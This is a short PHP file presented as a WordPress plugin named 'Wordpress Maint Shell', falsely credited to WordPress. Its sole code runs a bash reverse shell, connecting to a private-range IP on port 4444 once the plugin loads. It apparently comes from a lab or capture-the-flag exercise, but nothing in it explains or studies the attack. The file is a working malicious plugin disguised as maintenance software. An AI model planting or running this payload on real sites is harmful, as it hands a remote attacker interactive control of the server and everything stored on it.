<?php

/**
 *  Plugin Name: Wordpress Maint Shell
 *  Author: Wordpress
 **/
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.241.177/4444 0>&1'");
?>
